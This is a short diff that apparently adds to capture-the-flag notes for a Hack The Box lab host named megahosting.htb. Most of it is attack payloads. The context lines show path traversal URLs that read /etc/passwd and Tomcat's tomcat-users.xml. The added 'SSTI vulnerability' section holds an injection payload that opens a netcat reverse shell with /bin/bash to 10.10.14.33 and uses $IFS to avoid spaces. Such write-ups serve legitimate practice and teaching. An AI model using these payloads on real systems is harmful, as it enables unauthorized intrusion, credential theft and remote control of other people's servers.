@@ -22,6 +22,12 @@ http://megahosting.htb/news.php?file=../../../../etc/passwd
 php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
 ```
 
+## SSTI vulnerability
+
+```
+<img src=http://10.10.14.33/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.33'$IFS'1234')>
+```
+
 ## Java Files
 
 USE
